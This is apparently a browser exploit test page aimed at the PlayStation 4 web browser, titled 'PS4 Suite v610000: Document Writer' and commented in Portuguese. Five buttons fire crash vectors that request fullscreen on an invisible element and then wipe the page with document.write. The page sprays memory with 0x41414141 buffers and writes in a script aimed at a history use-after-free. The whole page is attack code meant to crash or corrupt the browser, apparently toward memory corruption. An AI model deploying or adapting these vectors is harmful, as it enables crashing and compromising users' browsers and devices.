<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v610000: Document Writer</title>
<style>
    body { background: #000; color: #ff0; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #ff0; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #600; color: #fff; font-weight: bold;
    }
    .ghost { display: none; width: 100px; height: 100px; background: red; }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #400; color: #fff; border: 2px solid #ff0;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #ff0; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v610000: THE DOCUMENT WRITER</h1>

<div class="status" id="msg">
    OBJETIVO: FULLSCREEN INVISÍVEL + DOCUMENT.WRITE<br>
    CLIQUE -> OK -> CRASH IMEDIATO
</div>

<button onclick="writer(w01)">01. Instant Write (Sync Nuke)</button>

<button onclick="writer(w02)">02. Microtask Write (Timeout 0)</button>

<button onclick="writer(w03)">03. Heavy Payload Write (Memory)</button>

<button onclick="writer(w04)">04. Internal Iframe Write</button>

<button onclick="writer(w05)">05. Script Tag Injection Write</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    
    // Preparação de Spray (antes da destruição)
    let spray = [];
    const pattern = new Uint32Array(1024).fill(0x41414141);

    function writer(vectorFunc) {
        Stage.innerHTML = "";
        spray = [];
        
        // 1. Configura
        const element = vectorFunc(Stage);
        
        // 2. Dispara a lógica
        setTimeout(() => {
            if(element.trigger) element.trigger();
        }, 50);
    }

    // =================================================================
    // 01. Instant Write (Sync Nuke)
    // Pede Fullscreen e imediatamente chama document.write.
    // Não dá tempo nem do navegador respirar.
    // =================================================================
    function w01(stage) {
        const d = document.createElement('div');
        d.className = 'ghost'; // Invisível
        stage.appendChild(d);

        d.trigger = () => {
            window.alert("⚠️ WRITE NUKE ⚠️\nAo clicar OK: Fullscreen -> document.write()");
            
            // 1. Prepara a memória (Spray Prévio)
            for(let i=0; i<1000; i++) spray.push(new Uint32Array(pattern));
            
            // 2. Fullscreen no invisível
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            else if (d.requestFullscreen) d.requestFullscreen();
            
            // 3. O CRASH (Síncrono)
            // Isso limpa o documento ATUAL, matando o elemento 'd'
            // enquanto o navegador ainda está processando a linha acima.
            document.write("<h1>CRASHED?</h1>");
            document.close();
        };
        return d;
    }

    // =================================================================
    // 02. Microtask Write (Timeout 0)
    // Dá 1 milissegundo para o Fullscreen começar a inicializar
    // e ENTÃO apaga o mundo. Aumenta a chance de pegar o renderizador "no pulo".
    // =================================================================
    function w02(stage) {
        const d = document.createElement('div');
        d.className = 'ghost';
        stage.appendChild(d);

        d.trigger = () => {
            window.alert("⚠️ TIMED WRITE ⚠️\nAo clicar OK: Fullscreen -> (1ms) -> Write.");
            
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            
            // Agenda a destruição para o próximo ciclo de CPU
            setTimeout(() => {
                document.open();
                document.write("<h1>TOO LATE</h1>");
                document.close();
                
                // Tenta alocar memória no novo contexto
                try { 
                    const x = new ArrayBuffer(1024*1024*10); 
                } catch(e){}
            }, 0);
        };
        return d;
    }

    // =================================================================
    // 03. Heavy Payload Write (Memory)
    // Escreve uma string gigante. O navegador gasta tempo processando
    // o novo HTML enquanto o Fullscreen antigo ainda está pendente.
    // =================================================================
    function w03(stage) {
        const d = document.createElement('div');
        d.className = 'ghost';
        stage.appendChild(d);
        
        // String pesada
        const junkStr = "<div>A</div>".repeat(10000);

        d.trigger = () => {
            window.alert("⚠️ HEAVY WRITE ⚠️\nAo clicar OK: Fullscreen -> Escrever 10k Divs.");
            
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            
            // O processo de parsear esse HTML pesado concorre com a GPU
            document.write(junkStr);
            document.close();
        };
        return d;
    }

    // =================================================================
    // 04. Internal Iframe Write
    // O Iframe pede fullscreen nele mesmo (display:none dentro do iframe)
    // e depois escreve dentro de si mesmo. Isolamento de processo.
    // =================================================================
    function w04(stage) {
        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);
        
        ifr.onload = () => {
            const doc = ifr.contentDocument;
            const target = doc.createElement('div');
            target.style.display = 'none';
            doc.body.appendChild(target);
            
            ifr.trigger = () => {
                window.alert("⚠️ IFRAME SELF-WRITE ⚠️\nAo clicar OK: Fullscreen Interno -> Write Interno.");
                
                if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
                
                // Destrói o contexto do iframe de dentro pra fora
                doc.open();
                doc.write("DEAD");
                doc.close();
            };
        };
        // Fallback
        if(!ifr.trigger) ifr.trigger = ()=>{};
        return ifr;
    }

    // =================================================================
    // 05. Script Tag Injection Write
    // Escreve um novo <script> que tenta rodar código imediatamente
    // após a limpeza. Tenta manter o loop de crash vivo.
    // =================================================================
    function w05(stage) {
        const d = document.createElement('div');
        d.className = 'ghost';
        stage.appendChild(d);

        d.trigger = () => {
            window.alert("⚠️ SCRIPT INJECTION ⚠️\nAo clicar OK: Fullscreen -> Write Script.");
            
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            
            // Escreve um script que tenta acessar o histórico (History UAF)
            document.write("<script>history.pushState({},'','crash'); for(let i=0;i<1000;i++)Math.random();<\/script><h1>RUNNING</h1>");
            document.close();
        };
        return d;
    }

</script>
</body>
</html>
